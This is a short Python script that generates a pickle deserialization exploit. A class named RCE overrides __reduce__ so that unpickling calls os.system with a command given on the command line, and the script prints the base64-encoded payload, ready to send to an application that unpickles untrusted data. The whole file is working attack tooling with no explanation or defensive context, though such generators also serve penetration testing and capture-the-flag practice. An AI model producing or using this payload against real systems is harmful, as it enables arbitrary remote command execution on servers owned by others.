import pickle
import base64
import os
import argparse

class RCE:
    def __init__(self, payload: str) -> None:
        self.payload = payload

    def __reduce__(self) -> os.system:
        return os.system, (self.payload,)

def main():
    parser = argparse.ArgumentParser(description="create a pickle os.system payload.")
    parser.add_argument("--payload", required=True, help="payload cmd")

    args = parser.parse_args()

    payload = base64.b64encode(pickle.dumps(RCE(args.payload)))
    print(payload.decode())

if __name__ == "__main__":
    main()
